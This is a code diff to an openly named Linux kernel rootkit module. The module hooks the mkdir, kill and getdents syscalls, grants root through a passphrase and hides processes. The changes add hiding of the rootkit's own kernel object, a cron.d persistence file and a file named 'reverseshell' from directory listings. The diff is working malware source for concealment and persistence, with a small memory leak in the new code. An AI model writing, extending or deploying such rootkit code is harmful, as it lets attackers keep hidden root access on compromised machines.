@@ -2,7 +2,9 @@
 #include <linux/list.h>
 #include <linux/init.h>
 #include <linux/slab.h>
+#include <linux/path.h>
 #include <linux/sched.h>
+#include <linux/string.h>
 #include <linux/dirent.h>
 #include <linux/module.h>
 #include <linux/kernel.h>
@@ -39,6 +41,26 @@ MODULE_PARM_DESC(modulename, "Module name to hide");
 static char *passphrase = "1 4m 6r00t";
 module_param(passphrase, charp, 0000);
 MODULE_PARM_DESC(passphrase, "Passphrase to get root permissions from mkdir");
+
+static char *rootkitdirectory = "/root";
+module_param(rootkitdirectory, charp, 0000);
+MODULE_PARM_DESC(rootkitdirectory, "The rootkit directory (where kernel object and malware are stocked)");
+
+static char *rootkitfile = "6r00tkit.ko";
+module_param(rootkitfile, charp, 0000);
+MODULE_PARM_DESC(rootkitfile, "The rootkit filename");
+
+static char *persistencedirectory = "/etc/cron.d";
+module_param(persistencedirectory, charp, 0000);
+MODULE_PARM_DESC(persistencedirectory, "The persistence rootkit directory (where persistence file is stocked)");
+
+static char *persistencefile = "6r00tkit";
+module_param(persistencefile, charp, 0000);
+MODULE_PARM_DESC(persistencefile, "The persistence filename");
+
+static char *malwarefile = "reverseshell";
+module_param(malwarefile, charp, 0000);
+MODULE_PARM_DESC(malwarefile, "The malware filename");
 
 static long int killcode = 14600;
 module_param(killcode, long, 0000);
@@ -231,13 +253,12 @@ asmlinkage long kill_hook(pid_t pid, int signal) {
     if (signal == killcode) {
         // printk(KERN_CRIT "kill hooking\n");
         set_hidden_flags(pid);
-    } else {
-#ifdef PTREGS_SYSCALL_STUBS
-        return kill_base(regs);
-#else
-        return kill_base(pid, signal);
-#endif
     }
+#ifdef PTREGS_SYSCALL_STUBS
+    return kill_base(regs);
+#else
+    return kill_base(pid, signal);
+#endif
     return 0;
 }
 
@@ -255,6 +276,27 @@ unsigned long int has_hidden_flag(pid_t pid) {
 }
 
 /*
+    This function gets full filename from file descriptor.
+*/
+char* get_filename_from_fd(int fd) {
+    char *filename = NULL;
+
+    struct file *file = fget(fd);
+    if (file) {
+        struct path path = file->f_path;
+        filename = kmalloc(PATH_MAX, GFP_KERNEL);
+        if (filename) {
+            path_get(&path);
+            strcpy(filename, d_path(&path, filename, PATH_MAX));
+        }
+        fput(file);
+    }
+
+    return filename;
+}
+
+
+/*
     This function hooks getdents64 to hide files and directories.
 */
 #ifdef PTREGS_SYSCALL_STUBS
@@ -268,8 +310,14 @@ asmlinkage long getdents64_hook(unsigned int fd, struct linux_dirent64 *director
 #endif
 
     if (kernel_return <= 0) return kernel_return;
-    if (current->files->fdt->fd[fd]->f_path.dentry->d_inode->i_ino != PROC_ROOT_INO) return kernel_return;
-    
+    char *directoryname = get_filename_from_fd(fd);
+    if (
+        current->files->fdt->fd[fd]->f_path.dentry->d_inode->i_ino != PROC_ROOT_INO &&
+        strcmp(directoryname, rootkitdirectory) != 0 &&
+        strcmp(directoryname, persistencedirectory) != 0
+    ) return kernel_return;
+    kfree(directoryname);
+
     struct linux_dirent64 *directory_kernel_return = kzalloc(kernel_return, GFP_KERNEL);
     if (directory_kernel_return == NULL) return kernel_return;
 
@@ -284,7 +332,12 @@ asmlinkage long getdents64_hook(unsigned int fd, struct linux_dirent64 *director
     while (offset < kernel_return) {
         struct linux_dirent64 *current_directory = (void *)directory_kernel_return + offset;
 
-        if (has_hidden_flag(simple_strtoul(current_directory->d_name, NULL, 10))) {
+        if (
+            has_hidden_flag(simple_strtoul(current_directory->d_name, NULL, 10)) ||
+            strcmp(rootkitfile, current_directory->d_name) == 0 ||
+            strcmp(persistencefile, current_directory->d_name) == 0 ||
+            strcmp(malwarefile, current_directory->d_name) == 0
+        ) {
             // printk(KERN_CRIT "getdents64 hooking (hidden process)\n");
             if (current_directory == directory_kernel_return) {
                 // printk(KERN_CRIT "Hide first file or directory\n");
@@ -320,8 +373,14 @@ asmlinkage int getdents_hook(unsigned int fd, struct linux_dirent *directory, un
 #endif
 
     if (kernel_return <= 0) return kernel_return;
-    if (current->files->fdt->fd[fd]->f_path.dentry->d_inode->i_ino != PROC_ROOT_INO) return kernel_return;
-    
+    char *directoryname = get_filename_from_fd(fd);
+    if (
+        current->files->fdt->fd[fd]->f_path.dentry->d_inode->i_ino != PROC_ROOT_INO &&
+        strcmp(directoryname, rootkitdirectory) != 0 &&
+        strcmp(directoryname, persistencedirectory) != 0
+    ) return kernel_return;
+    kfree(directoryname);
+
     struct linux_dirent *directory_kernel_return = kzalloc(kernel_return, GFP_KERNEL);
     if (directory_kernel_return == NULL) return kernel_return;
 
@@ -336,7 +395,12 @@ asmlinkage int getdents_hook(unsigned int fd, struct linux_dirent *directory, un
     while (offset < kernel_return) {
         struct linux_dirent *current_directory = (void *)directory_kernel_return + offset;
 
-        if (has_hidden_flag(simple_strtoul(current_directory->d_name, NULL, 10))) {
+        if (
+            has_hidden_flag(simple_strtoul(current_directory->d_name, NULL, 10)) ||
+            strcmp(rootkitfile, current_directory->d_name) == 0 ||
+            strcmp(persistencefile, current_directory->d_name) == 0 ||
+            strcmp(malwarefile, current_directory->d_name) == 0
+        ) {
             // printk(KERN_CRIT "getdents hooking (hidden process)\n");
             if (current_directory == directory_kernel_return) {
                 // printk(KERN_CRIT "Hide first file or directory\n");
@@ -393,7 +457,7 @@ void *syscall_hooking(unsigned long new_function, unsigned int syscall_number) {
 */
 static int __init grootkit_init(void) {
     // printk(KERN_INFO "Protect and hide\n");
-    protect_and_hide();
+    // protect_and_hide();
     // printk(KERN_INFO "mkdir syscall hooking\n");
     mkdir_base = syscall_hooking((unsigned long)mkdir_hook, (unsigned int)__NR_mkdir);
     // printk(KERN_INFO "kill syscall hooking\n");
